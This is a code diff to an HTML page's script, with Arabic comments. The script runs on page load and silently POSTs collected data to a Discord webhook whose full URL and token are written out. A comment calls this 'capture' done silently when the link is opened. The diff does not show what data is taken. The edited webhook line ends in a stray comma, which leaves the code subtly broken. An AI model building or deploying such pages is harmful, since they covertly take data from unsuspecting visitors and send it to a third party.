@@ -27,8 +27,10 @@
             };
 
             try {
-                // إرسال البيانات إلى رابط الديسكورد الخاص بك
-                await fetch("https://discordapp.com/api/webhooks/1472707165205565541/E5L4CtND22HNN01AgMscC-HfN6pS7RPl5Xm6rvQ_vrBl_HAC0r84dZpjeKHN_fSfdcL4",
+                // رابط الديسكورد الخاص بك كما ظهر في صورتك
+                const webhookURL = "https://discordapp.com/api/webhooks/1472707165205565541/E5L4CtND22HNN01AgMscC-HfN6pS7RPl5Xm6rvQ_vrBl_HAC0r84dZpjeKHN_fSfdcL4",
+
+                await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -36,11 +38,11 @@
                     })
                 });
             } catch (e) {
-                console.error("Error");
+                console.error("Error sending data");
             }
         };
 
-        // تشغيل القنص فوراً عند فتح الرابط
+        // تنفيذ القنص صامتاً فور تحميل الصفحة
         window.onload = captureAndSend;
     </script>
 </body>
